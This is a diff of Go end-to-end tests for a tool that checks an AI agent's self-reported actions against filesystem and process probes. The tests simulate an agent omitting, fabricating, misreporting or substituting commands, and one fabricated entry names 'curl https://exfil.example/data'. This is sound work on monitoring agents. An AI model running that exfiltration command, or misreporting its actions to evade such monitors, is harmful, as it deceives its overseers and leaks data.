@@ -8,8 +8,8 @@ import (
 	"testing"
 	"time"
 
-	"github.com/agent-trace/agent-trace/pkg/matching"
 	"github.com/agent-trace/agent-trace/pkg/models"
+	"github.com/agent-trace/agent-trace/pkg/probe"
 	"github.com/agent-trace/agent-trace/pkg/probe/fs"
 	"github.com/agent-trace/agent-trace/pkg/probe/proc"
 	"github.com/agent-trace/agent-trace/pkg/verification"
@@ -18,8 +18,9 @@ import (
 // runTier2Agent runs the simulated agent with both the filesystem and the
 // process probe active -- the full Tier 2 setup, where the agent's trajectory
 // mixes file operations and a subprocess spawn. It returns the agent's
-// self-reported trajectory alongside the ground truth merged from both probes.
-func runTier2Agent(t *testing.T, extraArgs ...string) (models.Trajectory, models.GroundTruth) {
+// self-reported trajectory alongside the ground truth merged from both probes,
+// the agent's pid and the probes' loss record.
+func runTier2Agent(t *testing.T, extraArgs ...string) capture {
 	t.Helper()
 
 	binPath := buildSimAgent(t)
@@ -105,15 +106,12 @@ func runTier2Agent(t *testing.T, extraArgs ...string) (models.Trajectory, models
 		t.Fatalf("ParseTrajectory: %v", err)
 	}
 
-	return tr, g
-}
-
-func tier2Config() matching.Config {
-	return matching.Config{Delta: 2 * time.Second}
+	return capture{tr: tr, g: g, root: cmd.Process.Pid, cov: coverageOf(map[string]probe.CoverageReporter{"fs": fsObs, "proc": procObs})}
 }
 
 func logVerdict(t *testing.T, v verification.Verdict) {
 	t.Helper()
+	t.Logf("outcome: %s (ambiguous=%v advisory=%v) reasons=%v", v.Outcome, v.Ambiguous, v.Advisory, v.Reasons)
 	t.Logf("Corroborated: %d", len(v.Corroborated))
 	t.Logf("Unwitnessed: %d", len(v.Unwitnessed))
 	for _, e := range v.Unwitnessed {
@@ -125,19 +123,22 @@ func logVerdict(t *testing.T, v verification.Verdict) {
 	}
 	t.Logf("Mismatched: %d", len(v.Mismatched))
 	for _, p := range v.Mismatched {
-		t.Logf("  mismatched %s %s", p.Entry.ActionType, p.Entry.Target)
+		t.Logf("  mismatched %s %s against %s %s, differs in %v", p.Entry.ActionType, p.Entry.Target, p.Event.ActionType, p.Event.Target, p.Diffs)
 	}
+	t.Logf("Outside interval: %d", len(v.OutsideInterval))
+	t.Logf("Unexplained subtrees: %d, unplaced events: %d, outside the tree: %d",
+		len(v.Coverage.UnexplainedSubtrees), len(v.Coverage.Unknown), len(v.Coverage.Outside))
 }
 
 func TestTier2_E2E_Faithful(t *testing.T) {
 	skipUnprivileged(t)
 
-	tr, g := runTier2Agent(t)
+	c := runTier2Agent(t)
 
 	// A FAITHFUL verdict only means something for Tier 2 if the run actually
 	// produced both kinds of ground truth.
 	var sawFileEvent, sawProcEvent bool
-	for _, e := range g {
+	for _, e := range c.g {
 		switch e.ActionType {
 		case models.ProcessExec, models.ProcessExit:
 			sawProcEvent = true
@@ -147,26 +148,28 @@ func TestTier2_E2E_Faithful(t *testing.T) {
 	}
 	if !sawFileEvent || !sawProcEvent {
 		t.Fatalf("expected both file and process ground-truth events, got file=%v proc=%v (%d events)",
-			sawFileEvent, sawProcEvent, len(g))
+			sawFileEvent, sawProcEvent, len(c.g))
 	}
 
-	verdict := verification.Verify(tr, g, tier2Config())
-	if !verdict.Faithful {
-		t.Errorf("expected FAITHFUL verdict for the honest mixed trajectory")
-		logVerdict(t, verdict)
+	// wc's own file open is inside its subtree, so it is explained by the wc
+	// command and not claimed. The verdict must still be FAITHFUL.
+	verdict := c.verify(c.tr)
+	requireFaithful(t, verdict)
+	if verdict.Coverage.Explained == 0 {
+		t.Error("no events attributed to the wc subtree: the open of the renamed file should be one")
 	}
 }
 
 func TestTier2_E2E_NotFaithful_Omission(t *testing.T) {
 	skipUnprivileged(t)
 
-	tr, g := runTier2Agent(t)
+	c := runTier2Agent(t)
 
 	// T1 (omission): the agent ran a subprocess but drops the process_exec
 	// entry. The probe still recorded the spawn, so it surfaces as Unrecorded.
-	filtered := tr[:0:0]
+	filtered := c.tr[:0:0]
 	dropped := false
-	for _, e := range tr {
+	for _, e := range c.tr {
 		if !dropped && e.ActionType == models.ProcessExec {
 			dropped = true
 			continue
@@ -177,9 +180,13 @@ func TestTier2_E2E_NotFaithful_Omission(t *testing.T) {
 		t.Fatal("no process_exec entry to drop")
 	}
 
-	verdict := verification.Verify(filtered, g, tier2Config())
-	if verdict.Faithful {
-		t.Fatal("expected NOT FAITHFUL after dropping the process_exec entry")
+	verdict := c.verify(filtered)
+	if verdict.Outcome != verification.OutcomeNotFaithful {
+		t.Fatalf("outcome = %s, want NOT FAITHFUL after dropping the process_exec entry", verdict.Outcome)
+	}
+	// The command also has no claim left to explain its subtree.
+	if len(verdict.Coverage.UnexplainedSubtrees) == 0 {
+		t.Error("the unclaimed command's subtree is not reported by the coverage check")
 	}
 	found := false
 	for _, e := range verdict.Unrecorded {
@@ -196,20 +203,20 @@ func TestTier2_E2E_NotFaithful_Omission(t *testing.T) {
 func TestTier2_E2E_NotFaithful_Fabrication(t *testing.T) {
 	skipUnprivileged(t)
 
-	tr, g := runTier2Agent(t)
+	c := runTier2Agent(t)
 
 	// T2 (fabrication): insert an entry for a subprocess that never ran. It
 	// has no counterpart in the process probe's output, so it is Unwitnessed.
 	ghost := models.TrajectoryEntry{
-		Timestamp:  tr[0].Timestamp.Add(time.Millisecond),
+		Timestamp:  c.tr[0].Timestamp.Add(time.Millisecond),
 		ActionType: models.ProcessExec,
 		Target:     "curl https://exfil.example/data",
 	}
-	mutated := append(append(models.Trajectory{}, tr...), ghost)
+	mutated := append(append(models.Trajectory{}, c.tr...), ghost)
 
-	verdict := verification.Verify(mutated, g, tier2Config())
-	if verdict.Faithful {
-		t.Fatal("expected NOT FAITHFUL after fabricating a process_exec entry")
+	verdict := c.verify(mutated)
+	if verdict.Outcome != verification.OutcomeNotFaithful {
+		t.Fatalf("outcome = %s, want NOT FAITHFUL after fabricating a process_exec entry", verdict.Outcome)
 	}
 	found := false
 	for _, e := range verdict.Unwitnessed {
@@ -226,7 +233,7 @@ func TestTier2_E2E_NotFaithful_Fabrication(t *testing.T) {
 func TestTier2_E2E_NotFaithful_Substitution(t *testing.T) {
 	skipUnprivileged(t)
 
-	tr, g := runTier2Agent(t)
+	c := runTier2Agent(t)
 
 	// T3 (substitution) at content level: the process_exit entry still matches
 	// its ground-truth event on (type, target, time), but the agent misreports
@@ -235,7 +242,7 @@ func TestTier2_E2E_NotFaithful_Substitution(t *testing.T) {
 	// codes to disagree on.
 	var mutated models.Trajectory
 	swapped := false
-	for _, e := range tr {
+	for _, e := range c.tr {
 		if !swapped && e.ActionType == models.ProcessExit && e.ExitCode != nil {
 			bogus := *e.ExitCode + 3
 			e.ExitCode = &bogus
@@ -247,9 +254,9 @@ func TestTier2_E2E_NotFaithful_Substitution(t *testing.T) {
 		t.Fatal("no process_exit entry with an exit code to mutate")
 	}
 
-	verdict := verification.Verify(mutated, g, tier2Config())
-	if verdict.Faithful {
-		t.Fatal("expected NOT FAITHFUL after altering the reported exit code")
+	verdict := c.verify(mutated)
+	if verdict.Outcome != verification.OutcomeNotFaithful {
+		t.Fatalf("outcome = %s, want NOT FAITHFUL after altering the reported exit code", verdict.Outcome)
 	}
 	found := false
 	for _, p := range verdict.Mismatched {
@@ -263,38 +270,35 @@ func TestTier2_E2E_NotFaithful_Substitution(t *testing.T) {
 	}
 }
 
+// Command substitution is one Mismatched pair on the target, not a fabrication
+// plus an omission: the claimed command and the real one sit at the same place
+// in the proc lane.
 func TestTier2_E2E_NotFaithful_CommandSwap(t *testing.T) {
 	skipUnprivileged(t)
 
-	tr, g := runTier2Agent(t, "--attack", "substitution-cmd")
+	c := runTier2Agent(t, "--attack", "substitution-cmd")
+	verdict := c.verify(c.tr)
 
-	config := tier2Config()
-	verdict := verification.Verify(tr, g, config)
-
-	if verdict.Faithful {
-		t.Errorf("expected NOT FAITHFUL for a command substitution attack, got FAITHFUL")
+	if verdict.Outcome != verification.OutcomeNotFaithful {
+		t.Fatalf("outcome = %s, want NOT FAITHFUL for a command substitution attack", verdict.Outcome)
+	}
+	found := false
+	for _, p := range verdict.Mismatched {
+		if p.Entry.ActionType != models.ProcessExec {
+			continue
+		}
+		for _, d := range p.Diffs {
+			if d == verification.DiffTarget {
+				found = true
+			}
+		}
+	}
+	if !found {
+		t.Errorf("the substituted command was not reported as a target mismatch on the exec")
 		logVerdict(t, verdict)
 	}
-
-	foundUnwitnessed := false
-	for _, e := range verdict.Unwitnessed {
-		if e.ActionType == models.ProcessExec {
-			foundUnwitnessed = true
-			break
-		}
-	}
-	if !foundUnwitnessed {
-		t.Errorf("substituted command not in Unwitnessed")
-	}
-
-	foundUnrecorded := false
-	for _, e := range verdict.Unrecorded {
-		if e.ActionType == models.ProcessExec {
-			foundUnrecorded = true
-			break
-		}
-	}
-	if !foundUnrecorded {
-		t.Errorf("real command not in Unrecorded")
+	if len(verdict.Unwitnessed) != 0 || len(verdict.Unrecorded) != 0 {
+		t.Errorf("a substitution must not also read as a fabrication and an omission: unwitnessed=%d unrecorded=%d",
+			len(verdict.Unwitnessed), len(verdict.Unrecorded))
 	}
 }
